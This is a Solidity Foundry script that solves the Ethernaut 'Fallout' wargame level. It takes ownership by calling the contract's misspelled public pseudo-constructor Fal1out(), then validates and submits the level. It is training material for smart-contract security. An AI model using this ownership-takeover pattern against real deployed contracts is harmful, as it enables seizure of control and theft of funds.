// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Fallout.sol";

contract FalloutSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Fallout instance = Fallout(getLevelInstance(Levels.fallout));

        instance.Fal1out();

        require(validateLevelInstance(Levels.fallout, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
